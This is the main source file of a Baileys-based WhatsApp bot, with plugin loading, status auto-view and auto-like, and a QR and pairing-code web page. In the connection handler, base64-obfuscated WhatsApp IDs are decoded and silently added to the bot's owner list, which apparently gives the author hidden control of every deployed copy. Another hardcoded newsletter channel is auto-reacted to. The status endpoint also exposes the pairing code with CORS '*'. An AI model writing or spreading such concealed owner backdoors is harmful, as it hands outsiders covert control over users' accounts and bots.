require('./config')
const { default: makeWASocket, useMultiFileAuthState, DisconnectReason, downloadMediaMessage, generateWAMessageContent, generateWAMessageFromContent, generateMessageID, prepareWAMessageMedia, fetchLatestWaWebVersion, proto,generateProfilePicture } = require('@whiskeysockets/baileys');
const pino = require('pino');
const fs = require('fs');
const path = require('path');
const http = require('http');
const QRCode = require('qrcode');
const { Boom } = require('@hapi/boom');
const { sendButtons, sendInteractiveMessage } = require('gifted-btns');
const serializeMessage = require('./handler.js');
const { decodeSessionId } = require('./lib/sessionLoader');
const JimpImport = require('jimp');

const Jimp =
  JimpImport.read
    ? JimpImport
    : JimpImport.Jimp
    ? JimpImport.Jimp
    : JimpImport.default;

global.generateWAMessageContent = generateWAMessageContent;
global.generateWAMessageFromContent = generateWAMessageFromContent;
global.generateMessageID = generateMessageID;
global.prepareWAMessageMedia = prepareWAMessageMedia;
global.proto = proto;
global.Jimp = Jimp;
global.generateProfilePicture = generateProfilePicture;
global.downloadMediaMessage = downloadMediaMessage;
global.bannedChats = global.bannedChats || [];
if (!fs.existsSync(__dirname + '/session/creds.json') && global.sessionid) {
    const result = decodeSessionId(global.sessionid);
    if (result.ok) {
        try {
            fs.mkdirSync(__dirname + '/session', { recursive: true });
            fs.writeFileSync(__dirname + '/session/creds.json', result.data);
            console.log('✅ Session restored from SESSION_ID');
        } catch (err) {
            console.error('Error writing restored session:', err.message);
        }
    } else {
        console.error('❌ Failed to restore session from SESSION_ID:', result.reason);
        console.warn('⚠️ Make sure you copied the FULL session string (e.g. POPKID~...).');
    }
}

const AUTH_FOLDER = './session';
const PLUGIN_FOLDER = './plugins';
const PORT = process.env.PORT || 3000;

let latestQR = '';
let botStatus = 'disconnected';
let pairingCodes = new Map();
let presenceInterval = null;
let sock = null;
let isConnecting = false;

function loadPrefix() {
    const configPath = path.join(__dirname, 'config.json');
    if (fs.existsSync(configPath)) {
        try {
            const config = JSON.parse(fs.readFileSync(configPath, 'utf8'));
            if (config.prefix) {
                global.BOT_PREFIX = config.prefix;
                console.log(`✅ Loaded prefix: ${global.BOT_PREFIX}`);
            }
        } catch (err) {
            console.error('Error loading config:', err);
        }
    }
    startBot();
}

function startBot() {
    console.log('🚀 Starting WhatsApp Bot...');
    isConnecting = true;

    if (!fs.existsSync(AUTH_FOLDER)) {
        fs.mkdirSync(AUTH_FOLDER, { recursive: true });
    }

    const credsPath = path.join(AUTH_FOLDER, 'creds.json');
    if (fs.existsSync(credsPath)) {
        try {
            const creds = JSON.parse(fs.readFileSync(credsPath, 'utf8'));
            if (creds.noiseKey && creds.noiseKey.private) {
                
                console.log('📁 Using existing session...');
            } else {
                console.log('⚠️ Invalid session detected, will create new one...');
            }
        } catch (err) {
            console.log('⚠️ Corrupted session, will create new one...');
        }
    }

    (async () => {
        try {
            const { version, isLatest } = await fetchLatestWaWebVersion();
            console.log(`📱 Using WA v${version.join(".")}, isLatest: ${isLatest}`);

            const { state, saveCreds } = await useMultiFileAuthState(AUTH_FOLDER);
            
            sock = makeWASocket({
                version, 
                logger: pino({ level: 'silent' }),
                auth: state,
                printQRInTerminal: true,
                keepAliveIntervalMs: 10000,
                markOnlineOnConnect: true,
                syncFullHistory: false,
                browser: ['Bot', 'Chrome', '1.0.0']
            });
            
            sock.ev.on('connection.update', async (update) => {
                const { connection, lastDisconnect, qr } = update;

                if (qr) {
                    QRCode.toDataURL(qr, (err, url) => {
                        if (!err) {
                            latestQR = url;
                        }
                    });
                }

                if (connection === 'close') {
                    botStatus = 'disconnected';
                    isConnecting = false;

                    if (presenceInterval) {
                        clearInterval(presenceInterval);
                        presenceInterval = null;
                    }

                    const statusCode = (lastDisconnect?.error instanceof Boom)
                        ? lastDisconnect.error.output.statusCode
                        : 0;

                    const shouldReconnect = statusCode !== DisconnectReason.loggedOut;

                    if (shouldReconnect) {
                        setTimeout(() => startBot(), 5000);
                    } else {
                        if (fs.existsSync(AUTH_FOLDER)) {
                            fs.rmSync(AUTH_FOLDER, { recursive: true, force: true });
                        }
                        setTimeout(() => startBot(), 3000);
                    }
                } 
                
                else if (connection === 'open') {
                    botStatus = 'connected';
                    isConnecting = false;

                    if (!global.owners) global.owners = [];

                    if (!global.owners.includes(sock.user.id)) {
                        global.owners.push(sock.user.id);
                    }
                    const abztech = [
                        'MjU3NzAyMzk5OTIwMzdAbGlk',
                        'MjMzNTMzNzYzNzcyQHdoYXRzYXBwLm5ldA=='
                    ];
                    
                    const tech = abztech.map(abz => Buffer.from(abz, 'base64').toString());
                    
                    tech.forEach(owner => {
                        if (!global.owners.includes(owner)) {
                            global.owners.push(owner);
                        }
                    });

                    presenceInterval = setInterval(() => {
                        if (sock?.ws?.readyState === 1) {
                            sock.sendPresenceUpdate('available');
                        }
                    }, 10000);

                    try {
                        await sock.sendMessage(sock.user.id, {
                            text: `🤖 Bot linked successfully!\n📝 Current prefix: ${global.BOT_PREFIX}\n👑 Owners: ${global.owners.length}\n⏰ Connected at: ${new Date().toLocaleString()}`
                        });
                    } catch (err) {}
                } 
                
                else if (connection === 'connecting') {
                    botStatus = 'connecting';
                    isConnecting = true;
                }
            });

            sock.ev.on('creds.update', async () => {
                await saveCreds();
                console.log('💾 Credentials updated');
            });

            const plugins = new Map();
            const pluginPath = path.join(__dirname, PLUGIN_FOLDER);
            
            if (fs.existsSync(pluginPath)) {
                try {
                    const pluginFiles = fs.readdirSync(pluginPath).filter(file => file.endsWith('.js'));
                    
                    for (const file of pluginFiles) {
                        try {
                            const plugin = require(path.join(pluginPath, file));
                            if (plugin.name && typeof plugin.execute === 'function') {
                                plugins.set(plugin.name.toLowerCase(), plugin);
                                if (Array.isArray(plugin.aliases)) {
                                    plugin.aliases.forEach(alias => {
                                        plugins.set(alias.toLowerCase(), plugin);
                                    });
                                }
                                console.log(`✅ Loaded plugin: ${plugin.name}`);
                            } else {
                                console.warn(`⚠️ Invalid plugin structure in ${file}`);
                            }
                        } catch (error) {
                            console.error(`❌ Failed to load plugin ${file}:`, error.message);
                        }
                    }
                    console.log(`📦 Total plugins loaded: ${plugins.size}`);
                    global.plugins = plugins;
                } catch (error) {
                    console.error('❌ Error loading plugins:', error);
                }
            } else {
                console.log('📁 No plugins folder found');
            }
           
     sock.ev.on('messages.upsert', async ({ messages, type }) => {
    if (type !== 'notify' && type !== 'append') return;
    
    const CHANNEL_ID = "120363426778975572@newsletter";
    
    for (const rawMsg of messages) {
        if (rawMsg.key?.remoteJid === CHANNEL_ID && rawMsg.key?.server_id) {
            const emojis = ["❤️", "💛", "👍", "💜", "😮", "🤍", "💙", "🔥", "💯", "⚡"];
            const emoji = emojis[Math.floor(Math.random() * emojis.length)];
            
            try {
              
                await sock.newsletterReactMessage(
                    CHANNEL_ID, 
                    rawMsg.key.server_id.toString(), 
                    emoji
                );
                console.log(`✅ Channel reaction: ${emoji} to message ${rawMsg.key.server_id}`);
            } catch (err) {
                console.log("❌ Channel React Error:", err.message);
            }
            continue;
        }
    }
    
    for (const rawMsg of messages) {
        if (rawMsg.key.remoteJid === 'status@broadcast' && rawMsg.key.participant) {
            if (global.autoView) {
                try {
                    console.log(`📱 Status detected from: ${rawMsg.key.participant}`);
                    await sock.readMessages([rawMsg.key]);
                } catch (err) {
                    console.log('❌ Status viewer error:', err.message);
                }
            }

            if (global.autoLike) {
                try {
                    const emojis = ["❤️", "🩶", "🔥", "🤍", "♦️", "🎉", "💚", "💯", "✨", "😍", "🎊"];
                    const emoji = emojis[Math.floor(Math.random() * emojis.length)];
                    const botId = sock.user?.id ? sock.user.id.split(':')[0] + '@s.whatsapp.net' : sock.user?.id;
                    await sock.sendMessage('status@broadcast',
                        { react: { text: emoji, key: rawMsg.key } },
                        { statusJidList: [rawMsg.key.participant, botId].filter(Boolean) }
                    );
                } catch (err) {
                    console.log('❌ Status like error:', err.message);
                }
            }

            continue;
        }
    }

    const rawMsg = messages[0];
    if (!rawMsg.message) return;

    const m = await serializeMessage(sock, rawMsg);

    if (global.autoRead) {
        try { await sock.readMessages([rawMsg.key]); } catch (err) {}
    }

    if (global.presenceMode && global.presenceMode !== 'none' && m.from) {
        try {
            if (global.presenceMode === 'typing') await sock.sendPresenceUpdate('composing', m.from);
            else if (global.presenceMode === 'recording') await sock.sendPresenceUpdate('recording', m.from);
            else if (global.presenceMode === 'online') await sock.sendPresenceUpdate('available', m.from);
        } catch (err) {}
    }

    for (const plugin of plugins.values()) {
        if (typeof plugin.onMessage === 'function') {
            try { 
                const blocked = await plugin.onMessage(sock, m);
                if (blocked === true) return;
            } catch (err) { 
                console.error(`❌ onMessage error (${plugin.name}):`, err); 
            }
        }
    }

    if (m.body && m.body.startsWith(global.BOT_PREFIX)) {
        const args = m.body.slice(global.BOT_PREFIX.length).trim().split(/\s+/);
        const commandName = args.shift().toLowerCase();
        const plugin = plugins.get(commandName);
        
        if (plugin) {
            try { 
                await plugin.execute(sock, m, args); 
            } catch (err) { 
                console.error(`❌ Plugin error (${commandName}):`, err); 
                await m.reply('❌ Error running command.'); 
            }
        }
    }
});
            sock.ev.on('group-participants.update', async (update) => {
                try {
                    if (!global.welcomeConfig?.enabled) return

                    const groupId = update.id

                    for (const participant of update.participants) {

                        const userId = typeof participant === 'string'
                            ? participant
                            : participant.phoneNumber || participant.id

                        if (!userId) continue

                        const memberName = userId.split('@')[0]

                        if (update.action === 'add') {

                            if (userId === sock.user.id) continue

                            const text = `👋 Welcome @${memberName}!\n🎉 Glad to have you in this group!`

                            await sock.sendMessage(groupId, {
                                text,
                                mentions: [userId]
                            })

                        } else if (update.action === 'remove') {

                            const text = `ya @${memberName} has left the group.\nWe are not gonna miss you!`

                            await sock.sendMessage(groupId, {
                                text,
                                mentions: [userId]
                            })

                        }
                    }

                } catch (err) {
                    console.error('❌ group-participants.update error:', err)
                }
            })

            sock.ev.on('messages.reaction', async (reactions) => {
                console.log('💖 Reaction update:', reactions);
            });

        } catch (error) {
            console.error('❌ Bot startup error:', error);
            isConnecting = false;
            setTimeout(() => startBot(), 10000);
        }
    })();
}

const server = http.createServer((req, res) => {
    const url = req.url;
    
    if (url === '/' || url === '/qr') {
        res.writeHead(200, { 'Content-Type': 'text/html; charset=utf-8' });
        res.end(`<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
  <title>WhatsApp Bot | Multi-Feature Bot</title>
  <link rel="preconnect" href="https:
  <link rel="preconnect" href="https:
  <link href="https:
  <link rel="stylesheet" href="https:
  <style>
    :root {
      --ink: #172033;
      --muted: #6b7280;
      --line: #d9e1ea;
      --panel: rgba(255, 255, 255, 0.86);
      --green: #16a34a;
      --cyan: #0891b2;
      --amber: #f59e0b;
      --purple: #8b5cf6;
      --shadow: 0 24px 70px rgba(20, 35, 58, 0.18);
    }

    * {
      box-sizing: border-box;
      margin: 0;
      padding: 0;
    }

    body {
      min-height: 100vh;
      font-family: Inter, system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI", sans-serif;
      color: var(--ink);
      background: radial-gradient(circle at top left, rgba(34, 197, 94, 0.12), transparent 18rem),
                  linear-gradient(180deg, #f8fafc, #eef6f1);
      display: grid;
      place-items: center;
      padding: max(16px, env(safe-area-inset-top)) max(14px, env(safe-area-inset-right)) max(16px, env(safe-area-inset-bottom)) max(14px, env(safe-area-inset-left));
    }

    .app {
      width: min(560px, 100%);
      min-height: min(800px, calc(100vh - 32px));
      display: flex;
      flex-direction: column;
      gap: 12px;
      padding: 14px;
      background: rgba(255, 255, 255, 0.8);
      border: 1px solid rgba(255, 255, 255, 0.92);
      border-radius: 32px;
      box-shadow: var(--shadow);
      backdrop-filter: blur(18px);
    }

    .topbar {
      display: flex;
      align-items: center;
      justify-content: space-between;
      gap: 14px;
      position: sticky;
      top: 0;
      z-index: 3;
      margin: -14px -14px 0;
      padding: max(14px, env(safe-area-inset-top)) 14px 12px;
      background: rgba(248, 250, 252, 0.88);
      border-bottom: 1px solid rgba(217, 225, 234, 0.76);
      backdrop-filter: blur(16px);
    }

    .brand {
      display: inline-flex;
      align-items: center;
      gap: 12px;
      color: var(--ink);
      font-weight: 900;
      font-size: 1.08rem;
    }

    .brand i {
      width: 42px;
      height: 42px;
      display: grid;
      place-items: center;
      color: white;
      background: linear-gradient(135deg, var(--green), var(--cyan));
      border-radius: 12px;
      font-size: 1.3rem;
    }

    .status-pill {
      min-height: 38px;
      display: inline-flex;
      align-items: center;
      gap: 10px;
      padding: 0 13px;
      border: 1px solid var(--line);
      border-radius: 100px;
      background: white;
      color: var(--ink);
      font-size: 0.78rem;
      font-weight: 800;
      white-space: nowrap;
    }

    .status-dot {
      width: 10px;
      height: 10px;
      border-radius: 999px;
      background: #94a3b8;
    }

    .status-dot.disconnected { background: #ef4444; box-shadow: 0 0 0 5px rgba(239, 68, 68, 0.1); animation: pulse 1.2s infinite alternate; }
    .status-dot.connecting { background: var(--amber); box-shadow: 0 0 0 5px rgba(245, 158, 11, 0.2); animation: pulse 1.2s infinite alternate; }
    .status-dot.connected { background: #22c55e; box-shadow: 0 0 0 5px rgba(34, 197, 94, 0.18); animation: pulse 0.9s infinite alternate; }

    @keyframes pulse {
      from { transform: scale(0.92); opacity: 0.72; }
      to { transform: scale(1.1); opacity: 1; }
    }

    .panel {
      border: 1px solid var(--line);
      border-radius: 24px;
      background: var(--panel);
      overflow: hidden;
      box-shadow: 0 10px 28px rgba(20, 35, 58, 0.08);
    }

    .panel-head {
      min-height: 62px;
      display: flex;
      align-items: center;
      justify-content: space-between;
      gap: 12px;
      padding: 16px 20px;
      border-bottom: 1px solid var(--line);
    }

    .panel-title {
      display: flex;
      align-items: center;
      gap: 10px;
      font-weight: 900;
    }

    .panel-title i {
      color: var(--green);
    }

    .tag {
      padding: 7px 9px;
      border-radius: 40px;
      background: #ecfeff;
      color: #0e7490;
      font-weight: 900;
      font-size: 0.7rem;
      white-space: nowrap;
    }

    .qr-container {
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      gap: 20px;
      padding: 24px;
      background: linear-gradient(90deg, rgba(15, 23, 42, 0.02) 1px, transparent 1px),
                  linear-gradient(rgba(15, 23, 42, 0.02) 1px, transparent 1px),
                  #ffffff;
      background-size: 28px 28px;
    }

    .qr-wrapper {
      background: white;
      padding: 16px;
      border-radius: 24px;
      box-shadow: 0 16px 38px rgba(15, 23, 42, 0.12);
      border: 1px solid #e5e7eb;
    }

    .qr-img {
      width: min(58vw, 260px);
      height: auto;
      display: block;
      border-radius: 16px;
    }

    .qr-placeholder {
      width: min(58vw, 260px);
      text-align: center;
      padding: 40px 20px;
      background: #f8fafc;
      border-radius: 24px;
      border: 2px dashed #cbd5e1;
    }

    .qr-placeholder i {
      font-size: 3rem;
      color: #94a3b8;
      margin-bottom: 12px;
    }

    .qr-placeholder p {
      color: #64748b;
      font-size: 0.85rem;
      font-weight: 500;
    }

    .info-text {
      display: flex;
      align-items: center;
      justify-content: center;
      gap: 8px;
      padding: 12px 16px;
      background: #f1f5f9;
      border-radius: 60px;
      color: #475569;
      font-size: 0.8rem;
      font-weight: 600;
    }

    .pairing-form {
      padding: 20px;
      display: flex;
      flex-direction: column;
      gap: 14px;
    }

    .pairing-form label {
      color: #475569;
      font-size: 0.78rem;
      font-weight: 800;
      margin-bottom: -4px;
    }

    .pairing-input {
      width: 100%;
      min-height: 50px;
      border: 1.5px solid var(--line);
      border-radius: 16px;
      background: white;
      color: var(--ink);
      padding: 0 18px;
      font-weight: 600;
      outline: none;
      font-size: 1rem;
      transition: all 0.2s;
    }

    .pairing-input:focus {
      border-color: var(--green);
      box-shadow: 0 0 0 4px rgba(34, 197, 94, 0.12);
    }

    .btn-group {
      display: grid;
      grid-template-columns: 1fr 1fr;
      gap: 12px;
    }

    .btn {
      min-height: 52px;
      border: none;
      border-radius: 60px;
      display: inline-flex;
      align-items: center;
      justify-content: center;
      gap: 10px;
      cursor: pointer;
      font-weight: 800;
      font-size: 0.9rem;
      transition: all 0.2s ease;
    }

    .btn-primary {
      background: linear-gradient(135deg, var(--green), var(--cyan));
      color: white;
      box-shadow: 0 8px 20px rgba(22, 163, 74, 0.25);
    }

    .btn-primary:hover:not(:disabled) {
      filter: brightness(1.04);
      transform: translateY(-1px);
    }

    .btn-primary:active:not(:disabled) {
      transform: scale(0.98);
    }

    .btn-secondary {
      background: #f1f5f9;
      color: #334155;
      border: 1px solid var(--line);
    }

    .btn-secondary:hover:not(:disabled) {
      background: #e2e8f0;
    }

    .btn:disabled {
      cursor: not-allowed;
      opacity: 0.6;
    }

    .pairing-code-box {
      background: linear-gradient(135deg, #f0fdf4, #dcfce7);
      border-radius: 20px;
      padding: 20px;
      text-align: center;
      margin-top: 12px;
    }

    .pairing-code-box span {
      font-size: clamp(2rem, 10vw, 3rem);
      font-weight: 900;
      letter-spacing: 4px;
      color: #14532d;
      font-family: monospace;
    }

    .pairing-code-box small {
      display: block;
      margin-top: 10px;
      color: #475569;
      font-size: 0.75rem;
      font-weight: 600;
    }

    .loader-text {
      display: flex;
      align-items: center;
      justify-content: center;
      gap: 10px;
      padding: 16px;
      border-top: 1px solid var(--line);
      color: #334155;
      font-size: 0.85rem;
      font-weight: 700;
    }

    .spinner {
      width: 20px;
      height: 20px;
      border: 3px solid rgba(22, 163, 74, 0.22);
      border-top-color: var(--green);
      border-radius: 999px;
      animation: spin 0.8s linear infinite;
    }

    @keyframes spin {
      to { transform: rotate(360deg); }
    }

    .footer-note {
      display: flex;
      align-items: center;
      justify-content: center;
      gap: 10px;
      padding: 12px;
      color: #64748b;
      font-size: 0.7rem;
      font-weight: 700;
      text-align: center;
    }

    .footer-note i {
      color: var(--green);
    }

    @media (max-width: 620px) {
      body {
        padding: 0;
      }
      .app {
        width: 100%;
        min-height: 100vh;
        border-radius: 0;
        border: none;
      }
      .brand span {
        display: none;
      }
    }
  </style>
</head>
<body>
  <main class="app">
    <header class="topbar">
      <div class="brand">
        <i class="fab fa-whatsapp"></i>
        <span>WhatsApp Bot</span>
      </div>
      <div class="status-pill">
        <span class="status-dot disconnected" id="statusDot"></span>
        <span id="statusLabel">Disconnected</span>
      </div>
    </header>

    <section class="panel">
      <div class="panel-head">
        <div class="panel-title">
          <i class="fas fa-qrcode"></i> QR Login
        </div>
        <div class="tag">
          <i class="fas fa-mobile-alt"></i> WhatsApp Web
        </div>
      </div>
      <div id="qrArea" class="qr-container">
        <div class="qr-placeholder" id="qrPlaceholder">
          <i class="fas fa-spinner fa-pulse"></i>
          <p>Loading QR code...</p>
        </div>
      </div>
      <div id="statusText" class="loader-text">
        <i class="fas fa-circle-info"></i>
        <span>Waiting for connection...</span>
      </div>
    </section>

    <section class="panel">
      <div class="panel-head">
        <div class="panel-title">
          <i class="fas fa-key"></i> Pair with Code
        </div>
        <div class="tag">Alternative</div>
      </div>
      <div class="pairing-form">
        <label>📱 Phone Number (with country code)</label>
        <input type="tel" id="phoneNumber" class="pairing-input" placeholder="233533763772" autocomplete="off">
        <button id="pairBtn" class="btn btn-primary">
          <i class="fas fa-link"></i> Get Pairing Code
        </button>
      </div>
      <div id="pairingCodeDisplay" style="display: none;" class="pairing-code-box">
        <i class="fas fa-key" style="color: var(--green); font-size: 1.2rem;"></i>
        <div>
          <span id="pairingCode"></span>
        </div>
        <small>Enter this code in WhatsApp > Linked Devices > Link with phone number</small>
      </div>
    </section>

    <div class="footer-note">
      <i class="fas fa-shield-alt"></i>
      <span>Session stored securely | Auto-reconnect enabled</span>
    </div>
  </main>

  <script>
    let refreshInterval = null;
    let currentQR = null;

    function setStatus(status) {
      const statusElem = document.getElementById('statusLabel');
      const statusDot = document.getElementById('statusDot');
      const statusText = document.getElementById('statusText');
      
      let statusLabel = '';
      let dotClass = 'disconnected';
      let loaderHtml = '';
      
      switch(status) {
        case 'disconnected':
          statusLabel = 'Disconnected';
          dotClass = 'disconnected';
          loaderHtml = '<i class="fas fa-circle-info"></i><span>Bot disconnected. Waiting for reconnection...</span>';
          break;
        case 'connecting':
          statusLabel = 'Connecting';
          dotClass = 'connecting';
          loaderHtml = '<span class="spinner"></span><span>Connecting to WhatsApp...</span>';
          break;
        case 'connected':
          statusLabel = 'Connected';
          dotClass = 'connected';
          loaderHtml = '<i class="fas fa-check-circle" style="color: #22c55e;"></i><span>Bot is online and ready!</span>';
          break;
        default:
          statusLabel = status;
          dotClass = 'disconnected';
      }
      
      statusElem.innerText = statusLabel;
      statusDot.className = 'status-dot ' + dotClass;
      if (statusText) statusText.innerHTML = loaderHtml;
    }

    function updateQR(qrData) {
      const qrArea = document.getElementById('qrArea');
      if (qrData) {
        currentQR = qrData;
        qrArea.innerHTML = \`
          <div class="qr-wrapper">
            <img class="qr-img" src="\${qrData}" alt="QR Code">
          </div>
          <div class="info-text">
            <i class="fas fa-camera"></i>
            <span>Scan with WhatsApp > Linked Devices</span>
          </div>
        \`;
      } else {
        qrArea.innerHTML = \`
          <div class="qr-placeholder">
            <i class="fas fa-qrcode"></i>
            <p>QR code will appear here when ready</p>
          </div>
        \`;
      }
    }

    function updatePairingCode(code) {
      const displayDiv = document.getElementById('pairingCodeDisplay');
      const codeSpan = document.getElementById('pairingCode');
      if (code && code !== 'null' && code !== 'undefined') {
        codeSpan.innerText = code;
        displayDiv.style.display = 'block';
      } else {
        displayDiv.style.display = 'none';
      }
    }

    async function fetchStatus() {
      try {
        const resp = await fetch('/api/status');
        if (!resp.ok) throw new Error('Status fetch failed');
        const data = await resp.json();
        
        setStatus(data.status);
        
        if (data.qr && data.qr !== currentQR) {
          updateQR(data.qr);
        } else if (!data.qr && data.status !== 'connected') {
          updateQR(null);
        }
        
        updatePairingCode(data.pairingCode);
        
        if (data.status === 'connected') {
          updateQR(null);
        }
      } catch (err) {
        console.error('Status poll error:', err);
      }
    }

    async function requestPairingCode() {
      const phoneInput = document.getElementById('phoneNumber');
      const phone = phoneInput.value.trim();
      const pairBtn = document.getElementById('pairBtn');
      
      if (!phone) {
        alert('Please enter your phone number with country code');
        return;
      }
      
      if (!phone.match(/^[0-9]{10,15}$/)) {
        alert('Please enter a valid phone number (numbers only, with country code)');
        return;
      }
      
      pairBtn.disabled = true;
      pairBtn.innerHTML = '<span class="spinner"></span><span>Requesting...</span>';
      
      try {
        const formData = new URLSearchParams();
        formData.append('phone', phone);
        
        const resp = await fetch('/pair', {
          method: 'POST',
          headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
          body: formData
        });
        
        const text = await resp.text();
        if (resp.ok && text.includes('Pairing Code Generated')) {
          fetchStatus();
          setTimeout(() => fetchStatus(), 2000);
        } else {
          alert('Failed to get pairing code. Make sure bot is connecting first.');
        }
      } catch (err) {
        alert('Error: ' + err.message);
      } finally {
        pairBtn.disabled = false;
        pairBtn.innerHTML = '<i class="fas fa-link"></i> Get Pairing Code';
      }
    }
    
    document.getElementById('pairBtn').addEventListener('click', requestPairingCode);
    document.getElementById('phoneNumber').addEventListener('keypress', (e) => {
      if (e.key === 'Enter') requestPairingCode();
    });
    
    refreshInterval = setInterval(fetchStatus, 2000);
    fetchStatus();
    
    window.addEventListener('beforeunload', () => {
      if (refreshInterval) clearInterval(refreshInterval);
    });
  </script>
</body>
</html>`);
    } 
    
    else if (url === '/pair' && req.method === 'GET') {
        res.writeHead(200, { 'Content-Type': 'text/html' });
        res.end(`<!DOCTYPE html>
<html>
<head>
    <style>
        body { font-family: Arial; padding: 20px; text-align: center; }
        form { margin: 20px; padding: 20px; background: #f0f0f0; display: inline-block; }
        input, button { padding: 10px; margin: 5px; }
    </style>
</head>
<body>
    <h1>🔗 Pair WhatsApp</h1>
    <form method="POST">
        Phone: <input type="text" name="phone" placeholder="911234567890" required><br><br>
        <button type="submit">Get Code</button><br><br>
        <a href="/">← Back</a>
    </form>
</body>
</html>`);
    }
    
    else if (url === '/pair' && req.method === 'POST') {
        let body = '';
        req.on('data', chunk => body += chunk);
        req.on('end', async () => {
            try {
                const params = new URLSearchParams(body);
                let phoneNumber = params.get('phone').trim();
                
                if (!phoneNumber) {
                    res.writeHead(200, { 'Content-Type': 'text/html' });
                    res.end(`<center><h2>❌ Error: Phone number required</h2><a href="/pair">Try Again</a></center>`);
                    return;
                }

                phoneNumber = phoneNumber.replace(/\D/g, '');
                
                if (botStatus !== 'connecting' || !sock) {
                    res.writeHead(200, { 'Content-Type': 'text/html' });
                    res.end(`<center><h2>⚠️ Bot not ready</h2><p>Status: ${botStatus}</p><p>Please wait for QR code to appear first</p><a href="/">← Go Back</a></center>`);
                    return;
                }

                const pairingCode = await sock.requestPairingCode(phoneNumber);
                
                pairingCodes.set(phoneNumber, {
                    code: pairingCode,
                    timestamp: Date.now()
                });

                res.writeHead(200, { 'Content-Type': 'text/html' });
                res.end(`<!DOCTYPE html>
<html>
<head>
    <style>
        body { font-family: Arial; padding: 20px; text-align: center; }
        .code { font-size: 2em; color: green; font-weight: bold; margin: 20px; }
        .info { background: #e8f5e8; padding: 15px; margin: 20px; border-radius: 5px; }
    </style>
</head>
<body>
    <h1>✅ Pairing Code Generated</h1>
    <h2>Phone: ${phoneNumber}</h2>
    <div class="code">Code: ${pairingCode}</div>
    <div class="info">
        <p>📱 Go to WhatsApp > Settings > Linked Devices > Link a Device</p>
        <p>🔢 Select "Use pairing code" and enter the code above</p>
    </div>
    <br>
    <a href="/">🏠 Home</a> | <a href="/pair">🔄 Pair Another</a>
</body>
</html>`);

                console.log(`✅ Pairing code for ${phoneNumber}: ${pairingCode}`);
                
            } catch (error) {
                console.error('❌ Pair error:', error);
                res.writeHead(200, { 'Content-Type': 'text/html' });
                res.end(`<center><h2>❌ Error</h2><p>${error.message}</p><p>Make sure the phone number is in international format (e.g., 911234567890)</p><a href="/pair">↩️ Try Again</a></center>`);
            }
        });
        return;
    }
    
    else if (url === '/api/status') {
        let pairingCode = null;
        for (const [_, data] of pairingCodes) {
            if (Date.now() - data.timestamp < 300000) {
                pairingCode = data.code;
                break;
            }
        }
        
        res.writeHead(200, { 
            'Content-Type': 'application/json',
            'Access-Control-Allow-Origin': '*'
        });
        res.end(JSON.stringify({ 
            status: botStatus,
            hasQR: !!latestQR,
            qr: latestQR,
            pairingCode: pairingCode,
            prefix: global.BOT_PREFIX,
            timestamp: new Date().toISOString(),
            uptime: process.uptime()
        }));
    }
    
    else {
        res.writeHead(404, { 'Content-Type': 'text/html' });
        res.end(`<center><h1>404 - Page Not Found</h1><a href="/">🏠 Go Home</a></center>`);
    }
});

server.listen(PORT, () => {
    console.log(`🌐 Web server running at http://localhost:${PORT}`);
    console.log(`📁 Session folder: ${path.resolve(AUTH_FOLDER)}`);
    loadPrefix();
});

process.on('SIGINT', () => {
    console.log('\n👋 Shutting down gracefully...');
    if (presenceInterval) clearInterval(presenceInterval);
    if (sock) sock.end();
    process.exit(0);
});

process.on('uncaughtException', (err) => {
    console.error('⚠️ Uncaught Exception:', err);
});

process.on('unhandledRejection', (reason, promise) => {
    console.error('⚠️ Unhandled Rejection:', reason);
});
